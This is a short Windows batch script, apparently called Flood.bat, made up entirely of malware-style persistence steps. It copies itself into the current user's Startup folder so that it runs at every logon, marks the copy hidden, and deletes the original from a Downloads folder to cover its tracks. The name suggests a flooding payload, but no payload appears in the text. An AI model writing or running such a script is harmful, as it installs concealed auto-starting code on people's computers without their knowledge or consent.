@echo off
title none
color 02

copy Flood.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h Flood.bat
cd C:\Users\ROHIT\Downloads
del Flood.bat
